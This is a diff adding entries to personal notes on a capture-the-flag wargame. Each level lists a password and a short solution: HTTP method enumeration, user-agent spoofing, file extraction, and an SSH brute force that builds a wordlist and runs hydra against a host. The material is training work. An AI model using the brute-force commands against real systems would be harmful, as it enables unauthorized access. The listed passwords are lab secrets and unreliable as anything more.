@@ -171,6 +171,7 @@ sol;
     for w in $(cat pages.txt); do
       curl -sf "http://127.0.0.1/${w}.html" && echo "$w.html"
     done
+
 -lvl celeste
 pass: VLSNMTKwSV2o8Tn
 call type: mysql brute force
@@ -185,5 +186,41 @@ explanation:
         -x - match whole line only (no partial garbage)
   <() - (process substitution), urns command output into a fake file, So grep can read it like a normal file
 
-    
+-lv nina
+pass: tPlqxSKuT4eP3yr
+chall type: HTTP method enumeration
+sol; 
+    for m in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE CONNECT; do r=$(curl -s -X $m http://localhost/method.php); echo "$m -> $r"; done
+
+-lvl kira 
+pass: 33EtHoz9a0w2Yqo
+chall type: spoofing user agent
+sol;
+  curl -H "User-agent: <agentName>" http://localhost
+
+-lvl veronica
+pass: QTOel6BodTx2cwX 
+chall type: accessing aliases
+sol; 
+    cat .bashrc
+
+-lvl lana
+pass: UWbc0zNEVVops1v
+chall type: POSIX tar archive 
+sol;
+    scp to yor machine
+    tar -xvf <zip.gz>
+
+-lvl noa
+pass: 9WWOPoeJrq6ncvJ
+sol; 
+    strings <file>
+    remov \n char
+
+-lvl maia
+-pass: h1hnDPHpydEjoEN
+chall type: ssh brute force
+sol; for a in {a..z}; do for b in {a..z}; do echo "v7xUVE2e5bjUc$a$b"; done; done > pass.txt
+      hyfra -l <user> -P pass.txt -s <port> <host> ssh
+
 
